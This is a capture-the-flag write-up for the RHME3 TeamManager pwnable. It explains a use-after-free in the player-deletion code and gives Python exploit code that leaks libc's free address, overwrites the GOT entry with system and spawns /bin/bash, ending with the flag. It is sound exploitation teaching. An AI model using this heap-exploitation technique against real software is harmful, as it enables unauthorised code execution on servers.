## Exploitation (Pwnable, 1 point)

    This binary is running on pwn.rhme.riscure.com. Analyze it and find a way to compromise the server. You’ll find the flag in the filesystem.

We are provided the challenge [main.elf](main.elf) along with a copy of the version of [libc](libc.so.6) they are using on the server. Let's open up the challenge in IDA and take a look.

Inside of main the first thing we see are calls setting up the daemonization of the binary. If we execute the binary it closes before spawning due to the environment not being setup. Instead of reversing out the expected environment we can simply NOP it all out (_0x35 NOPs @ 0x000021ac_).

![main before modifications](main.png)

After the modifications are done we can run the executable and are presented with the menu.

```
$ ./main.elf
Welcome to your TeamManager (TM)!
0.- Exit
1.- Add player
2.- Remove player
3.- Select player
4.- Edit player
5.- Show player
6.- Show team
Your choice:
```

Diving into the binary the initial impression is a Use-After-Free vulnerability. We are provided the ability to create players, delete players, assign a player as the currently selected, and print out information of players.

Inside of _select_player_ a global pointer _selected_ is set to our choosen player.

![select_player](select.png)

Looking at the code for _delete_player_ it does not check if we are deleting the _selected_ player.

![delete_player](delete.png)

Using this vulnerability we can overwrite arbitrary data on the heap.

---

_Initially I attempted this as a generic heap exploitation problem. I quickly ran up against a wall with not having the primitives necessary to write the data I needed. Leaking heap addresses was easy from the DWORD fields. Though we could only write at max 999 via the integer fields of player and the name field cannot contain null chars due to the use of strlen and strcpy. This makes purely heap exploitation extremely difficult._


Stepping back for a minute let's look at the primitives we have available. Two objects are allocated onto the heap, first the player of size 0x18, and the name of size n+1. The struct of player is as follows:
```
struct Player
{
  _DWORD atk;
  _DWORD def;
  _DWORD spd;
  _DWORD prc;
  char *name;
};
```
Creating and editing a player are the same. We can set the _DWORD_ fields to a number between 0 and 999. The _char*_ is _realloc_'d if _strlen(name)_ is less than the new name length. The name field has a max length of 0x100 and a bad char set of [0x00, 0x0A]. It's at this point I realized my mistake and ran checksec.

```
RELRO           STACK CANARY      NX            PIE             [...]         FILE
Partial RELRO   Canary found      NX enabled    No PIE          [...]         main.elf
```

With no ASLR we do not need any information leak of the process and can simply hardcode the address. With Partial RELRO we can overwrite the address of any imported function to another.

With this new found information let's craft our exploit. When deleting a player _free_ is called first on our name and secondly on the player. This makes for a good target to replace with a call to _system_ in classic return-to-libc fashion. If we can modify the player->name pointer we can overwrite data inside the GOT. Easy way to accomplish this is to allocate a string large enough and overwrite our dangling player pointer at the correct address with a new address.

```python
# Quick and dirty heap misalignement, worked first try
for x in range(11):
    create_player("A"*0x78)
select_player(0)
for x in range(11):
    delete_player(x)


# Next created player will have the name overwrite our selected player
# Allowing us to both read and write via the name attribute
create_player("A"*0x10 + pack("<Q", 0x603018) + "A"*0x20)
```

Success! Now when we print the player we leak out the address of _free_ inside of libc. From here we can calculate the address of _system_ and get the flag.
```python
libc_free = unpack("<Q", leak()[0].ljust(8, '\x00'))[0]
print "Libc FREE @ 0x%x" % libc_free


# Load the provided libc and calculate the address of `system` based on the leaked address of `free`
e = ELF('libc.so.6')
base = libc_free - e.symbols['free']
libc_system = base + e.symbols['system']
set_name(pack("<Q", libc_system))


# Now let's create out system command
# We send delete manually as bash will be spawned
create_player("/bin/bash")
r.send("2\n1\n")

r.interactive()
```

Full working solution here: [exploit.py](exploit.py)

**RHME3{h3ap_0f_tr0uble?}**
